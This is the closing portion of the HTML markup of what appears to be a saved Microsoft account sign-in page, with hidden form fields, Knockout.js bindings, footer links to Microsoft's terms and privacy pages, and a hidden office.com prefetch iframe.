        <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAAD--DLA3VO7QrddgJg7WevrvzGTBai7rWYm2h_WPz31cMCfB1Z-tiWwZVuBfnz7ZLbkQS3Rt9neprd9mJAVvXttTlhtd6QyC2rc3iIxnltNaeqPrKPF0il_S4xjxamVXVGH6Yt8eoLV4GdPn_PwOur1c1vpNxj7nKnoHx58P_rqHzrRAPkmVY7fBPvXVv3fQRagnnebktfYxp2_GlUCvisCTLPX59xoB4fGIp8Ao7YKjCduLxn6r57rJa_qU4clXnW0XW-ZWQP65ZohoQuwFXqlzpFxAaGQO2-acesTJROmS1S7_UDvWVz91tLffDX_l8EUeAX8Qi3lEBpqVYbZjO32353FGQh3y70AcdIkY3KND4h4XQ9MDd_mTYqqmzn7R8MFdLBEeKhRqCCKeuTt_RorWg1vMBOeixVjIZT3yur3p_qlR7sSDW3CIJ574IZthebclH6JDiS56jjJtcM1c-Bt87G0X_uLNsif0B5zjR0DxwfI0_mnpyBfZk3_D0uNQkL6XAl01THIrH01Ij4_c0QzP_IbXlBvrIbC4lwjsejpjm9BCfBlnEC0HFZtZhtqd3qd7OFI3KYTyH-pf2rrN0OuIAA">
        <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value="">
        <input type="hidden" name="NewUser" value="1">
        <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="">
        <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
        <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
        <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0">
        <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1">
        <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
        <div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1">
<input type="hidden" name="i17" data-bind="value: srsFailed" value="">
<input type="hidden" name="i18" data-bind="value: srsSuccess" value="">
<input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
    <!-- /ko -->
        </div>

        <!-- ko if: $page.showFedCredAndNewSession -->
        <!-- ko if: $page.showFedCredButtons --><!-- /ko -->

        <!-- ko if: $page.newSession --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: $page.showDebugDetails --><!-- /ko -->
    </div>
</div>
<!-- /ko --></div>
        </div>
    </div>

    <!-- ko if: !svr.fHideFooter && $page.paginationControlMethods() && $page.paginationControlMethods().hasInitialViewShown() -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground(),
            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">

        <div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://www.microsoft.com/en-US/servicesagreement/" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://privacy.microsoft.com/en-US/privacystatement" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
        <!-- /ko -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->

    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
    <a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.fShowLegalMessagingInline && showLinks --><!-- /ko --></div>
    </div>
    <!-- /ko -->
</div>
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
    <!-- /ko -->
<!-- /ko --></div>
    <!-- /ko -->
</form>

<form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>

<!-- ko if: svr.urlCBPartnerPreload -->
<div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe style="display: none;" src="https://www.office.com/prefetch/prefetch" width="0" height="0"></iframe></div>
<!-- /ko --></div><input id="ext-version" type="hidden" value="1.3.6"></body></html>